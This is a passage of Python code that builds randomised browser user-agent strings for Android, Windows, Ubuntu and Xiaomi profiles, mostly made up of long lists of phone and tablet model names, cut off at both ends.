'LYA-AL00P', 'EVR-AN00', 'EVR-AL00', 'EVR-AN00', 'EVR-L29', 'EVR-AL00', 'EVR-AL00', 'EVR-N29', 'TAS-AL00', 'TAS-AL00', 'TAS-L29', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AN00', 'TAS-AN00', 'TAS-AN00', 'TAS-AN00', 'TAS-AN00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'LIO-L29', 'LIO-AN00', 'LIO-L29', 'LIO-AN00', 'LIO-AL00', 'LIO-AN00', 'LIO-AN00', 'LIO-AL00', 'LIO-N29', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'Mate30 RS', 'LIO-AN00P', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'OCE-AN10', 'OCE-AN10', 'OCE-AN10', 'OCE-AN10', 'OCE-AN10', 'NOH-AL10', 'NOH-NX9', 'NOH-AN00', 'NOH-AN00', 'NOH-AL10', 'NOH-AN01', 'NOH-AN00', 'NOH-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'Mate 40 RS', 'OCE-AN50', 'OCE-AN50', 'OCE-AL50', 'OCE-AN50', 'OCE-AN50', 'OCE-AN50', 'OCE-AL50', 'OCE-AN50', 'OCE-AN50', 'OCE-AN50', 'CET-AL00', 'CET-LX9', 'CET-AL00', 'HUAWEI Mate 50', 'CET-AL00', 'DCO-AL00', 'CET-AL60', 'CET-AL60', 'HUAWEI MATE 7', 'HUAWEI NXT-AL10', 'HUAWEI NXT-L29', 'MHA-L29', 'MHA-AL00', 'MHA-AL00', 'MHA-AL00', 'MHA-AL00', 'MHA-L09', 'BLL-L23', 'LON-L29', 'LON-AL00', 'LON-AL00-PD', 'LON-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-L29', 'HUAWEI CRR-UL00', 'HUAWEI CRR-L09', 'HUAWEI CRR-UL20', 'HUAWEI CRR-CL00', 'BND-L34', 'TAH-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN10', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN50', 'TET-AN50', 'TET-AN50', 'TET-AN50', 'TET-AN50', 'TAH-AN00m', 'TAH-AN00m', 'TAH-AN00m', 'TAH-AN00m', 'PAL-LX9', 'PAL-AL00', 'PAL-AL00', 'PAL-AL00', 'HUAWEI Mate30', 'DBY-W09', 'DBY-W09', 'DBY-W09', 'DBY-W09', 'DBY-W09', 'MON-AL19', 'MON-W19', 'GOT-AL09', 'GOT-AL09', 'GOT-AL09', 'GOT-W29', 'GOT-W29', 'AGS3-L09', 'HUAWEI MediaPad', 'HUAWEI MediaPad', '403HW', 'HUAWEI MediaPad', 'S8-306L', 'HUAWEI MediaPad', 'Huawei MediaPad', 'X1 7.0', 'Huawei MediaPad', 'S8-701w', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MON-AL19B', 'MON-AL19B', 'MON-AL19B', 'BTV-DL09', 'BTV-W09', 'BAH-W09', 'CPN-L09', 'CPN-AL00', 'CPN-W09', 'BAH-L09', 'BAH2-W19', 'JDN2-L09', 'BAH2-L09', 'BAH2-AL10', 'AGR-L09', 'KOB2-L03', 'T1-A21w', 'T1-A21L', 'T1-A23L', 'T1-701u', 'T1-701u', 'T1-823L', 'T1-823L', 'T1-821w', 'MediaPad T1 8.0', 'AGS-W09', 'AGS-L09', 'AGS-L03', 'BG2-U01', 'BG2-W09', 'KOB-L09', 'BZK-L00', 'KOB-W09', 'AGS2-L09', 'AGS2-W09', 'GEM-701L', 'GEM-703L', 'GEM-702L', 'Nexus 6P', 'Nexus 6P', 'HUAWEI CAN-L11', 'HUAWEI CAN-L12', 'HUAWEI CAN-L01', 'HUAWEI CAZ-AL10', '1080x1788', 'NCO-LX1', 'NCO-AL00', 'GLA-LX1', 'GLA-AL00', 'PIC-TL00', 'PIC-LX9', 'PIC-AL00', '704HW', 'BAC-L03', 'BAC-TL00', 'BAC-L01', 'BAC-TL00', 'BAC-AL00', 'BAC-L22', 'BAC-L21', 'BAC-AL00', 'BAC-L21', 'RNE-L22', 'HWI-AL00', 'HWI-AL00', 'HWI-AL00', 'HWI-TL00', 'HWI-AL00', 'PAR-LX1', 'PAR-AL00', 'PAR-LX9', 'PAR-AL00', 'ANE-AL00', 'INE-LX2', 'INE-LX2r', 'VCE-L22', 'VCE-TL00', 'VCE-AL00', 'VCE-AL00', 'VCE-AL00', 'MAR-AL00', 'MAR-AL00', 'MAR-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL10', 'SEA-AL10', 'SEA-AL10', 'SEA-AL10', 'SEA-AL10', 'GLK-AL00', 'GLK-TL00', 'GLK-TL00', 'GLK-LX1U', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'SPN-TL00', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'JNY-AL10', 'JNY-AL10', 'JNY-AL10', 'JNY-AL10', 'JNY-AL10', 'JEF-TN00', 'JEF-NX9', 'JEF-AN20', 'JEF-AN00', 'JEF-AN20', 'JEF-AN00', 'JER-AN20', 'JER-AN10', 'JER-TN10', 'JER-AN10', 'JER-AN10', 'JER-AN20', 'JER-AN10', 'CDL-AN50', 'CDY-NX9B', 'CDY-AN00', 'CDY-AN00', 'JNY-LX2', 'ANG-LX2', 'ANG-LX1', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AN00', 'BRQ-AN00', 'BRQ-AN00', 'BRQ-AN00', 'BRQ-AN00', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'CHL-AL60', 'CHL-AL60', 'NEN-LX1', 'NEN-L22', 'NAM-LX9', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'JLN-LX1', 'JLN-LX3', '608HW', 'PRA-LX2', 'PRA-LX3', 'HUAWEI MLA-L11', 'DIG-L01', 'WAS-AL00', 'FIG-LX1', 'FIG-LX2', 'FIG-LX3', 'POT-LX1', 'POT-LX3', 'POT-LX2J', 'POT-LX1AF', 'POT-LX1T', 'PPA-LX2', 'PPA-LX1', 'P Smart S', 'STK-LX1', 'MZ-STK-LX1', 'VTR-L09', 'VTR-L29', 'VTR-AL00', 'WAS-LX1A', 'WAS-TL10', 'VKY-AL00', 'VKY-L09', 'VKY-L29', 'BAC-L23', 'HUAWEI P11', 'EML-L09', 'EML-L29', 'EML-AL00', 'EML-AL00', 'EML-L29', 'ANE-LX1', 'ANE-LX2', 'ANE-LX3', 'ANE-LX2J', 'CLT-L29', 'CLT-AL00', 'CLT-L09', 'CLT-L04', 'CLT-AL00', 'ELE-AL00', 'ELE-L09', 'ELE-AL00', 'ELE-L29', 'ELE-L04', 'ELE-AL00', 'MAR-LX1A', 'MAR-LX1M', 'MAR-LX1A', 'MAR-LX2', 'MAR-LX3A', 'MAR-LX1B', 'VOG-AL10', 'VOG-L29', 'VOG-L09', 'HUAWEI P30PRO', 'ANA-LX4', 'JNY-LX1', 'ART-L29', 'ART-L29N', 'ELS-NX9', 'ELS-AN00', 'ELS-AN00', 'ELS-AN00', 'ELS-AN10', 'ELS-AN10', 'ELS-N39', 'ELS-AN10', 'ABR-LX9', 'ABR-AL00', 'Huawei P50', 'ABR-AL00', 'BAL-L49', 'BAL-AL00', 'JAD-AL50', 'ABR-AL60', 'ABR-AL90', 'ABR-AL60', 'ABR-AL90', 'ABR-AL60', 'ABR-AL90', 'ABR-AL60', 'ABR-AL60', 'ABR-AL60', 'HUAWEI P6-U06', 'HUAWEI P6s', 'HUAWEI P7 mini', 'HUAWEI P7 mini', 'HUAWEI P7 mini', 'HUAWEI GRA-L09', 'HUAWEI GRA-UL00', 'ALE-L21', 'ALE-L23', 'ALE-L21', 'ALE-L21', 'PRA-LX1', 'PRA-LA1', 'HUAWEI P8max', 'HUAWEI GRA-UL10', 'HUAWEI-P8Lite', 'HUAWEI-P8Lite', 'EVA-L09', 'EVA-DL00', 'EVA-L19', 'EVA-AL00', 'EVA-AL10', 'HUAWEI VNS-L31', 'HUAWEI VNS-L21', 'HUAWEI VNS-L22', 'SLA-L22', 'SLA-L02', 'HUAWEI VNS-L52', 'HUAWEI VNS-L52', 'DIG-L03', 'DIG-L23', 'VIE-L29', 'VIE-L09', 'VIE-AL10', 'VIE-AL10', 'SM-A336B', 'SM-A536E', 'M2101K6R', 'SM-A307G', 'SM-A528B', 'LM-K200', '2201116SG', 'SM-A107M', 'CPH2239', 'SM-A205G', 'M2004J19C', 'M2102J20SG', 'SM-A336M', 'SM-A127M', 'SM-G975U', 'SM-A730F', 'SM-G950F', 'M2007J20CG', 'T671E', 'HUAWEI_Q201', 'Huawei S7', 'HUAWEI-S7', 'HUAWEI-S7', 'HUAWEI-S7', 'S8600', 'S8600', 'S8600', 'HUAWEI S9', 'HUAWEI ATH-UL01', 'HUAWEI ATH-UL06', 'KANT-360', 'KANT-360S', 'LEO-BX9', 'LEO-DLXXE', 'HUAWEI T1 7.0', 'B988', 'ZT-10013G', 'B988', 'B988', 'HUAWEI T8100', 'HUAWEI T8500', 'HUAWEI T8600', 'T8620', 'T8620', 'T8620', 'T8830Pro', 'T8830Pro', 'T8830Pro', 'HUAWEI T8833', 'HUAWEI T8833', 'HUAWEI T8833', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8951', 'HUAWEI T8951', 'HUAWEI T8951', 'HUAWEI_T8951', 'HUAWEI_T8951', 'HUAWEI T8951', 'HUAWEI T8951', 'T9200', 'T9200', 'T9200', 'HUAWEI-U20', 'HUAWEI U8120', 'U8180', 'U8180', 'U8180', 'MegaFon U8180', 'Kyivstar Terra', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8230', 'U8220/U8230', 'HuaweiU8300', 'U8350', 'U8350', 'GM FOX', 'U8350', 'Barcelona', 'U8350', 'U8350', 'U8350', 'U8350', 'U8350-51', 'U8350', 'U8350', 'U8350', 'U8350-51', 'Personal U8350', 'U8350', 'U8350', 'U8350', 'U8350', 'MF8503', 'ICE', 'MF8503', 'MF8503', 'HuaweiU8500', 'HuaweiU8510', 'S41HW', 'U8600', 'U8600', 'U8600', 'U8600', 'U8600', 'U8600', 'U8600', 'Huawei u8650', 'Huawei u8650', 'U8650', 'U8650-1', 'U8650', 'U8650', 'U8650', 'U8650-1', 'U8650-1', 'U8650', 'MTC 955', 'U8650', 'U8650', 'U8650-1', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'Prism', 'Prism', 'Prism', 'U8651T', 'Prism', 'U8651T', 'U8651T', 'Prism', 'U8652', 'Huawei-U8652', 'U8652', 'Huawei-U8652', 'Huawei-U8652', 'Huawei-U8652', 'Huawei-U8652', 'Android 2.3.5', 'U8655-51', 'U8655-1', 'U8655-1', 'U8655-1', 'MTC 965', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'Etisalat', 'U8655-1', 'U8655-1', 'U8655-51', 'U8655-1', 'U8660', 'SONIC', 'HUAWEI U8661', 'HUAWEI_U8661', 'HUAWEI U8661', 'HUAWEI U8661', 'HUAWEI U8661', 'HUAWEI U8661', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'GT-19100', 'U8666-1', 'U8666-1', 'U8666-1', 'MTC Fit', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-51', 'U8666-1', 'U8666-51', 'U8666-51', 'U8666-51', 'U8666-51', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666N', 'HUAWEI U8666N', 'HUAWEI U8666N', 'HUAWEI U8666N', 'HUAWEI U8666N', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'T-MobilemyTouch', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'Prism II', 'Prism II', 'Prism II', 'Prism II', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Ucell', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8815-51', 'U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'Galaxy S5', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'MTC Viva', 'HUAWEI U8816', 'U8816', 'MTC Viva', 'U8816', 'U8816', 'U8820', 'U8820', 'U8820', 'U8820', 'U8820', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI_U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI_U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'U8832D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'HUAWEI-U8850', 'U8860-51', 'HUAWEI_U8860', 'U8867Z', 'U8867Z', 'U8867Z', 'Huawei U8900', 'HUAWEI U8950', 'HUAWEI U8950D', 'Oppo F9D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8951', 'Huawei-U9000', 'HUAWEI-U9000', 'HUAWEI-U9000', 'HUAWEI-U9000', 'U9200E', 'U9200E', 'U9200E', 'U9200E', 'U9200E', 'U9200E', '201HW', '201HW', '201HW', '201HW', 'U9500E', 'HW-01E', 'HW-01E', 'HW-01E', 'HW-01E', 'HUAWEI U9510', 'Huawei/U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI_U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'GL07S', 'GL07S', 'GL07S', 'GL07S', 'GL07S', 'GL07S', 'UM840', 'UM840', 'UM840', 'KANT-359', 'KANT-369', 'HUAWEI WATCH', 'ARS-L22', 'ARS-TL00', 'ARS-AL00', 'ARS-L22', 'Huawei Y221', 'Huawei y221', 'Huawei Y3 2017', 'CRO-U00', 'CRO-L22', 'CAG-L02', 'CAG-L22', 'HUAWEI Y300C', 'HUAWEI Y300C', 'HUAWEI_Y300C', 'HUAWEI Y300C', 'HUAWEI Y300C', 'HUAWEI Y300C', 'HUAWEI Y300C', 'Huawei Y301A1', 'Huawei Y301A1', 'Huawei Y301A1', 'Huawei Y301A1', 'Huawei Y301A2', 'Huawei Y301A2', 'Huawei Y301A2', 'HuaweiY301A2', 'Huawei Y320', 'Huawei Y320', 'Huawei Y320', 'Huawei Y330', 'Huawei Y330', 'HUAWEI Y330-U01', 'HUAWEI Y336-U02', 'Huawei Y360', 'HUAWEI Y360', 'HUAWEI LUA-L21', 'HUAWEI LUA-U22', 'MYA-L22', 'MYA-L23', 'MYA-U29', 'DRA-L21', 'DRA-LX3', 'DRA-L01', 'U', 'AMN-LX9', 'AMN-LX2', 'AMN-LX3', 'HUAWEI AMN-LX9', 'AMN-LX1', 'DRA-LX5', 'DRA-LX5', 'DRA-LX5', 'DRA-LX5', 'CRO-L23', 'CRO-L03', 'CRO-L03', 'CAG-L03', 'CAG-L23', 'DRA-LX2', 'MYA-L13', 'HUAWEI Y511', 'Huawei Y520', 'HUAWEI Y520', 'HUAWEI Y536A1', 'HUAWEI Y550', 'HUAWEIY560', 'Huawei Y5C', 'HUAWEI CUN-L22', 'HUAWEI CUN-U29', 'HUAWEI CUN-L21', 'HUAWEI CUN-L01', 'DRA-LX9', 'DRA-LX9', 'DRA-LX9', 'HUAWEI SCL-U31', 'HUAWEI SCC-U21', 'MYA-L11', 'MYA-L41', 'ATU-L22', 'ATU-L21', 'MRD-LX3', 'MRD-LX1', 'MRD-LX1F', 'MRD-LX1N', 'MRD-LX3', 'ATU-L31', 'TIT-L01', 'HUAWEI TIT-L01', 'HUAWEI TIT-AL00', 'MRD-LX2', 'Kavak Y625-U03', 'Y635-L03', 'Y635-L01', 'HUAWEI Y635-L03', 'Y635-L02', 'Y635-L21', 'Y635-L21', 'CAM-L21', 'HUAWEI CAM-L21', 'CAM-L23', 'CAM-L03', 'MED-LX9', 'MED-LX9N', 'H1711z', 'TRT-LX3', 'TRT-LX1', 'LDN-L01', 'LDN-LX3', 'LDN-L01', 'DUB-LX3', 'DUB-LX1', 'LDN-L21', 'LDN-L21', 'LDN-L21', 'TRT-L21A', 'LDN-LX2', 'DUB-LX2', 'DUB-AL20', 'PPA-LX3', 'Peppa-L23B', 'ART-L28', 'AQM-LX1', 'AQM-LX1', 'FLA-LX3', 'FLA-LX2', 'FLA-LX1', 'FLA-AL20', 'FLA-TL10', 'JKM-LX1', 'JKM-LX2', 'JKM-AL00b', 'JKM-AL00a', 'JKM-LX3', 'STK-L21', 'STK-L22', 'STK-LX3', 'FRL-L23', 'FRL-L22', 'FRL-L22'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Windows':
                    self.byte = random.choice(['Win64; x64', 'Win32; x86'])
                    self.windows = ('Mozilla/5.0 (Windows NT 10.0; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(self.byte, self.browser_version))

                    self.ubuntu_version = random.choice(['Ubuntu 20.10', 'U', 'Ubuntu 15.04', 'Ubuntu/15.10'])
                    self.byte = random.choice(['Linux armv7l', 'Linux x86_64', 'Linux i686'])
                    self.ubuntu = ('Mozilla/5.0 (X11; {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/{} Chrome/{} Safari/537.36'.format(self.ubuntu_version, self.byte, self.browser_version, self.browser_version))
                    self.useragent = random.choice([self.windows, self.ubuntu])
                elif self.jenis == 'Xiaomi':
                    self.android_version = random.choice(['10', '9', '11', '12'])
                    self.android_model = random.choice(['Xiaomi 10 Pro', '2107119DC', '2107119DC', '21091116UI', '21091116UI', '2201123G', '2201123C', 'Xiaomi 12', '2203129G', 'Xiaomi 12 Lite', '2201122G', 'Xiaomi 12 Pro', '2207122MC', '2207122MC', '2206123SC', '2206122SC', 'Xiaomi 12S Pro', '2206122SC', '2203121C', '2203121C', '2203121C', '22071212AG', 'Xiaomi 12T', 'Xiaomi 12T Pro', '22081212UG', 'Xiaomi 12T Pro', '2112123AG', '2211133G', '2211133C', 'Xiaomi 13', 'Xiaomi 13', 'Xiaomi 13', '2210129SG', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', '2210132C', 'Xiaomi 13 Pro', '2210132G', 'Xiaomi 13 Pro', '2210132C', 'xiaomi 6', 'xiaomi 6', 'xiaomi 8', 'SKR-H0', 'SKR-A0', 'SKW-H0', 'SKW-A0', 'DLT-H0', 'DLT-A0', 'SHARK KLE-A0', 'SHARK KLE-A0', 'Black Shark 3', 'SHARK KLE-A0', 'KLE-AO', 'SHARK KLE-H0', 'SHARK KLE-H0', 'SHARK MBU-A0', 'SHARK MBU-H0', 'SHARK MBU-H0', 'Black Shark 3S', 'SHARK PRS-H0', 'SHARK PRS-H0', 'SHARK PRS-A0', 'SHARK KSR-H0', 'SHARK KSR-A0', 'SHARK PAR-A0', 'SHARK PAR-H0', 'SHARK PAR-H0', 'SHARK KTUS-H0', 'SHARK KTUS-A0', 'SHARK KTUS-H0', 'AWM-A0', 'AWM-A0', 'AWM-A0', '2109119BC', '2109119BC', '2013023', '2013023', '2013023', '2013022', '2013022', '2013023', '2013023', '2014011', '2014011', 'id 2014011', '2014817', '2014817', '2014817', '2014817', '2014817', '2014817', '2014817', '2014818', '2014818', '2014818', '2014818', '2014818', '2014813', '2014811', '2014813', '2014811', '2014812', '2014813', '2014811', '2014813', '2014813', '2014811', '2014811', '2014501', '2014501', '2014501', 'HM NOTE 1TD', 'HM NOTE 1TD', 'Mi 10', 'Mi 10', 'Mi 10', 'M2002J9G', 'M2002J9E', 'M2002J9E', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'M2007J1SC', 'M2007J1SC', 'M2007J1SC', 'M2007J17I', 'M2007J17I', 'M2102J2SC', 'M2102J2SC', 'M2102J2SC', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'M2007J3SY', 'M2007J3SC', 'M2007J3SP', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'M2007J17G', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'M2007J3SG', 'M2011K2G', 'M2011K2C', 'Mi 11', 'Mi 11', 'M2011K2C', 'M2011K2C', 'M2101K9AG', 'M2101K9AG', 'Mi 11 Lite', '2109119DG', 'M2101K9G', 'M2101K9C', '2109119DI', 'M2102K1AC', 'M2102K1AC', 'M2102K1AC', 'M2102K1AC', 'Mi 11 Pro', 'Mi 11 Pro', 'M2102K1C', 'M2102K1C', 'M2102K1C', 'M2102K1G', 'Mi 11 Ultra', 'M2012K11G', 'Mi 11i', '21081111RG', '2107113SG', '2107113SI', 'M2012K11AI', 'M2012K11I', 'M2012K11I', 'MI 1S', 'MI 1S', 'MI 1S', 'MI 2', 'MI 2', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2S', 'MI 2S', 'MI 2S', 'MI 2S', 'MI 2SC', 'MI 2SC', 'MI 2SC', 'MI 2SC', 'MI 3', 'MI 3', 'MI 3', 'MI 30 Pro', 'MI 3C', 'MI 3C', 'MI 3C', 'MI 3W', 'MI 3W', 'MI 3W', 'Mi 4', 'MI 4', 'MI 4LTE', 'MI 4LTE', 'MI 4LTE', 'MI 4LTE', 'Mi-4c', 'Mi-4c', 'Mi-4c', 'Mi-4c', 'Mi 4i', 'Mi 4i', 'Mi 4i', 'Mi 4i', 'MI 4S', 'MI 4S', 'arm_64 MI 4S', 'MI 4S', 'MI 4W', 'MI 4W', 'MI 4W', 'MI 4W', 'MI 5', 'Mi 5', 'MI 5', 'MI 5', 'Mi 5C', 'Mi 5c', 'MI 5C', 'MI 5s', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5X Flow', 'MI 5X', 'MI 5X', 'Mi 5X', 'MI 5X', 'MI 6', 'MI 6', 'MI 6', 'MI 6X', 'MI 6X', 'MI 6X', 'MI 6X', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8 Lite', 'MI 8 Lite', 'MI 8 Lite', 'MI 8 Pro', 'MI 8 Pro', 'MI 8 Pro', 'MI 8 SE', 'MI 8 SE', 'MI 8 SE', 'MI 8 SE', 'MI 8 UD', 'MI 8 UD', 'MI 8 UD', 'MI 8 UD', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'Mi 9 Lite', 'Mi9 Pro 5G', 'Mi 9 Pro 5G', 'MI 9 ROY', 'MI 9 SE', 'MI 9 SE', 'Mi 9 SE', 'Mi 9T', 'Mi 9T Pro', 'Mi 9X', 'Mi A1', 'mi a13', 'Mi A2', 'Mi A2 Lite', 'Mi A3', 'Mi A3', 'MI A615FN', 'MiBOX2', 'MIBOX3', 'MiBOX3_PRO', 'MIBOX4', 'Mi CC 9', 'MI CC 9', 'MI CC 9', 'MI CC9 Pro', 'Mi CC9 Pro', 'MI CC9 Pro', 'MI CC9 Pro', 'MI CC 9e', 'MI CC 9e', 'MI CC 9e', 'MI CC 9e', 'MiProjA1', 'MI MAX', 'MI MAX', 'MI MAX', 'MI MAX', 'Mi Max', 'MI MAX', 'MI MAX 2', 'XIAOMI MI MAX 2', 'MI MAX 2', 'MI MAX 2', 'Mi Max 2', 'MI MAX 3', 'MI MAX 3', 'Mi Max 3', 'MIX', 'MIX', 'MIX Lite', 'MIX', 'Mix Plus', 'MIX 2', 'MIX 2', 'MIX 2', 'Mi MIX 2', 'MIX 2', 'Mi MIX 2S', 'MIX 2S', 'MIX 2S', 'MIX 2S', 'MIX 2S', 'Mi MIX 2S', 'Mi MIX 3', 'MIX 3', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', '2106118C', '2106118C', 